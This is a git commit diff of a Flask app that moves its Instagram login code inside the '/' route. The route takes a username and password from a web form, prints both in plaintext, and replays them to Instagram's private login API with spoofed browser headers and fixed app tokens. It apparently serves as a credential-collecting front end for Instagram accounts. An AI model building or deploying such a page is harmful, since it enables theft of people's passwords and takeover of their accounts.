c161fd35173242f25305a1261d1623b468ed70f9
ძεՏκƦαʍ⸙ <deskram@mail.ru>
2024-04-26 22:13:23 +0300

    UP

--- app.py
+++ app.py
@@ -26,52 +26,52 @@ app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
 
-def generate_enc_password(password):
-    time_now = int(time.time())
-    enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
-    return enc_password
-
-def login(username, password):
-    headers_login = {
-        'authority': 'www.instagram.com',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9',
-        'origin': 'https://www.instagram.com',
-        'referer': 'https://www.instagram.com/',
-        'sec-ch-prefers-color-scheme': 'light',
-        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': generate_user_agent(),
-        'viewport-width': '424',
-        'x-asbd-id': '198387',
-        'x-csrftoken': 'missing',
-        'x-ig-app-id': '936619743392459',
-        'x-ig-www-claim': 'hmac.AR1IMAIWPNnlPeUCa1Z9ZHzY6Pxeu3W04eOOFPE_XrauU1OR',
-        'x-instagram-ajax': '1006773434',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    enc_password = generate_enc_password(password)
-    data_login = {
-        'enc_password': enc_password,
-        'username': username,
-        'queryParams': '{}',
-        'optIntoOneTap': 'false',
-        'trustedDeviceRecords': '{}'
-    }
-
-    login_response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
-                                   headers=headers_login,
-                                   data=data_login)
-    return login_response
 
 @app.route('/', methods=['GET', 'POST'])
 def login_page():
     if request.method == 'POST':
+        def generate_enc_password(password):
+            time_now = int(time.time())
+            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
+            return enc_password
+
+        def login(username, password):
+            headers_login = {
+                'authority': 'www.instagram.com',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'origin': 'https://www.instagram.com',
+                'referer': 'https://www.instagram.com/',
+                'sec-ch-prefers-color-scheme': 'light',
+                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': generate_user_agent(),
+                'viewport-width': '424',
+                'x-asbd-id': '198387',
+                'x-csrftoken': 'missing',
+                'x-ig-app-id': '936619743392459',
+                'x-ig-www-claim': 'hmac.AR1IMAIWPNnlPeUCa1Z9ZHzY6Pxeu3W04eOOFPE_XrauU1OR',
+                'x-instagram-ajax': '1006773434',
+                'x-requested-with': 'XMLHttpRequest',
+            }
+
+            enc_password = generate_enc_password(password)
+            data_login = {
+                'enc_password': enc_password,
+                'username': username,
+                'queryParams': '{}',
+                'optIntoOneTap': 'false',
+                'trustedDeviceRecords': '{}'
+            }
+
+            login_response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
+                                        headers=headers_login,
+                                        data=data_login)
+            return login_response
         username = request.form.get('username')
         password = request.form.get('password')
         print(username,password)
